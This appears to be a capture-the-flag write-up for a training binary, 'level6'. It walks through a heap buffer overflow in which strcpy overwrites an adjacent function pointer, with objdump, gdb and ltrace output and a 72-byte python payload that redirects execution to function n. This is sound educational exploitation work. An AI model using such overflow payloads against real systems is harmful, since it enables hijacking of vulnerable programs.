In the code we can observe that the program use `strcpy` on a argument and store it in the heap. Although it store a pointer to a function right after. We could use a buffer overflow to
rewrite the value of the pointer from the function `m` to the function `n`.

## Investigation

First we need to get the adress of the `n` function.
```sh
objdump -t ./level6 | grep "n"
...
08048454 g     F .text	00000014              n
...
```
We can observe that `n` is stored at `0x08048454`

Next we need to know where the `func` function is stored.
```
(gdb) b *0x080484ce
(gdb) i r $eax
eax            0x804a050        134520912
```
So the function `func` is stored at `0x804a050`.

Finnaly we need to know from where are our arguments starting in the memory.
```sh
ltrace ./level6 aaaa
...
strcpy(0x0804a008, "aaaa")                                                = 0x0804a008
...
```
The result of the `strcpy` is stored at `0x0804a008`.

We can now calculate the length of our payload `0x804a050 - 0x0804a008 = 0x48 = 0d72` wich is a 72 chars long.

## Exploit

As seend before, our payload will have a 72 chars then the adress of the `n` function.
```shell
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```
